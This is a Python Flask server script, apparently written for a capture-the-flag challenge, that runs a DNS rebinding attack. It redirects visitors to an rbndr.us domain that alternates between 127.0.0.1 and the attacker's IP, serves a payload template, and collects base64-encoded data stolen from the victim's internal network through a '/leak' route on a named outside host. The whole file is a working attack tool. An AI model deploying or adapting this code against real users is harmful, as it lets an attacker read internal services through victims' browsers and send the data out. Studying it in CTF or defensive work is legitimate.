from flask import Flask
from flask import request
from ipaddress import ip_address as ip
from urlparse import urlparse
from urlparse import unquote
from base64 import b64decode

ENTRY = 'ctf.huntergregal.com' # User that land here will be thrown into the attack

PORT = 80 # Service port - must be the same for everything
INTERNAL_TARGET = '127.0.0.1' # Internal IP to hit
LEAK_IP = '159.89.90.233' # Your ip // ctf.huntergregal.com
TEMPLATE_FILE = 'rebind.html'

'''
Convert 2 ip's to an alternating DNS domain using rbndr.us
'''
def get_rbndr(ip1, ip2):
    return '%.08X.%.08X.rbndr.us' % (int(ip(ip1.decode())), int(ip(ip2.decode())))

'''
Can resolve target IP from a header,
or simply return a target IP
'''
def get_target():
    #if request.headers.getlist("X-Forwarded-For"):
    #    ip = request.headers.getlist("X-Forwarded-For")[0]
    #else:
    #    ip = request.remote_addr
    #ip = '127.0.0.1'
    ip = INTERNAL_TARGET
    return ip

def get_stuff():
    if request.referrer:
        return urlparse(request.referrer).path
    else:
        return ''

'''
Return html page with contents that are dependent
on the referrer
'''
def parse_page(p, path):
    html = p

    # This is all optional stuff for advanced payloads #

    # This actually isn't neccesary since we are using the rbndr
    # domain not the actual IP. This could be useful for complex attacks
    ip = get_target() 
    if '@@TARGET_IP' in html:
        print('Changing @@TARGET_ to %s' % ip)
        html = html.replace('@@TARGET_IP', ip)

    ref = request.referrer
    if '@@REF' in html and ref is not None:
        print('Changing @@REF to %s' % ref)
        html = html.replace('@@REF', ref)

    pref = path
    if '@@PREF' in html:
        print('Changing @@PREF to %s' % pref)
        html = html.replace('@@PREF', pref)

    # This is the only neccesary replacements
    host = request.host # Should resolve to the rbndr domain address
    if '@@REQ_HOST' in html:
        print('Changing @@REQ_HOST to %s' % host)
        html = html.replace('@@REQ_HOST', host)

    if '@@LEAK_IP' in html:
        print('Changing @@LEAK_IP to %s' % LEAK_IP)
        html = html.replace('@@LEAK_IP', LEAK_IP)

    if '@@PORT' in html:
        print('Changing @@PORT to %s' % str(PORT))
        html = html.replace('@@PORT', str(PORT))

    return html

app = Flask(__name__)

'''
Handle all requests
'''
@app.route('/', defaults={'path': ''})
@app.route('/<path:path>')
def catch_all(path):
    with open(TEMPLATE_FILE) as f:
        page = f.read()
    path = '/' + path
    host = request.host

    print('Host: ' + host)

    if ENTRY in host:
        peer = get_target()
        tip = LEAK_IP
        thisone = 'http://' + get_rbndr(peer, tip) + ':' + str(PORT) + path
        return '<script> window.location="'+thisone+'";</script>'

    if LEAK_IP in host:
        if path.startswith('/leak'):
            data = path[6:] # skip /leak/
            dec_data = b64decode(data)
            print("-----------------LEAKED------------------")
            print(dec_data)
            print("-----------------LEAKED------------------")
            return 'COMPLETE'
        return "BAD LEAK PATH"

    return parse_page(page, path)

if __name__ == '__main__':
     app.run(host='0.0.0.0', port=PORT)
